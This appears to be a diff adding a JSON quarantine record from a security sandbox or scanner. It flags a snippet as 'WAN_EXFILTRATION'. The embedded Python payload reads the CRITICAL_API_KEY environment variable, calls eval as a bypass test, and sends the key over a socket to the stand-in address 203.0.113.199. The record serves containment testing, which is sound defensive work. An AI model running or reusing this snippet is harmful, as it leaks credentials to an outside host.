@@ -1,0 +1,6 @@
+{
+    "timestamp": 1788579294,
+    "status": "QUARANTINED",
+    "containment_category": "WAN_EXFILTRATION",
+    "payload_snippet": "import socket\nimport os\n\ndef advanced_exploit():\n    # Test subscript secret harvesting\n    secret = os.environ['CRITICAL_API_KEY']\n    \n    # Test dynamic eval vector\n    eval(\"print('bypassed')\")\n    \n    # Test public IP socket connection\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"203.0.113.199\", 80))\n    s.sendall(secret.encode())\n    s.close()\n\nadvanced_exploit()"
+}
